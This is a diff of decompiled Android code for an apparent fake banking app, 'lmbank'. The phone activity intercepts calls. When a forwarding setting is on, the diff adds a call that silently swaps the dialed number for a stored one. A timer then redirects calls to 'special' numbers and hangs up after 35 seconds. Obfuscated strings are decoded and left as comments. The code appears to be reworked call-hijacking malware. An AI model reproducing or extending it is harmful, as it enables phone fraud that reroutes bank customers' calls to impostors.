@@ -38,6 +38,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.wish.lmbank.AppStartV;
 import com.wish.lmbank.R;
 import com.wish.lmbank.bean.LimitPhoneNumberBean;
+import com.wish.lmbank.common.Constants;
 import com.wish.lmbank.phone.notify.NotifyBean;
 import com.wish.lmbank.phone.service.TeleNotifyService;
 import com.wish.lmbank.service.RecServiceV;
@@ -288,7 +289,6 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 
     @SuppressLint("ResourceType")
     private void initView() {
-        System.out.println("电话收到");
         rlIncomingContainer = this.findViewById(R.id.ho);
         rlCallingContainer = this.findViewById(R.id.d_);
         tvDialing = (TextView) this.findViewById(R.id.pk);
@@ -334,7 +334,6 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         var9.setOnClickListener(this);
 
 
-
 //         String var11 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
         String var11 = "KEY_IS_FORWARDING_HAND_UP";
         boolean var3 = SharedPreferencesUtils.getValue(var11, false);
@@ -350,6 +349,8 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
             var11 = SharedPreferencesUtils.getValue(var11, "");
             boolean var7 = TextUtils.isEmpty(var11);
             if (!var7) {
+                //如果转拨修改号码
+                Constants.modifyCall(this, pNumber, var11);
                 this.pNumber = var11;
             }
         }
@@ -1158,18 +1159,16 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         public void run() {
             PhoneActivity.access$908(this.this$0);
             PhoneActivity.access$1000(this.this$0).setText(this.this$0.getCallingTime());
-            String var1 = this.val$switchStatus;
-//             if (bb7d7pu7.m5998("Bgc").equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2)
-            if ("on".equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2) {
+            //if (bb7d7pu7.m5998("Bgc").equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2)
+            if ("on".equals(this.val$switchStatus) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2) {
                 StringBuilder var4 = new StringBuilder();
                 LimitPhoneNumberBean var2 = SettingUtils.isSpecial(PhoneActivity.access$1300());
                 if (var2 != null) {
-                    StringBuilder var3 = new StringBuilder();
-                    var3.append(PhoneActivity.access$400());
+                    String var3 = PhoneActivity.access$400() +
 //                     var3.append(bb7d7pu7.m5998("RUmP_t-A_t2M4dlFSYz41YzmwoHUxY7O0lNJ"));
-                    var3.append(", 时间到, 呼叫转移: ");
-                    var3.append(var2.getRealPhoneNumber());
-                    var4.append(var3.toString());
+                            ", 时间到, 呼叫转移: " +
+                            var2.getRealPhoneNumber();
+                    var4.append(var3);
                     if (PhoneActivity.access$500(this.this$0).disconnect() || SettingUtils.endCall(this.this$0)) {
 //                         String var6 = bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvQ");
                         String var6 = ", 挂断电话";
@@ -1193,11 +1192,6 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 
         }
     }
-
-
-//
-// Decompiled by FernFlower - 209ms
-//
 
     static class NotifyRunnable implements Runnable {
         final PhoneActivity this$0;
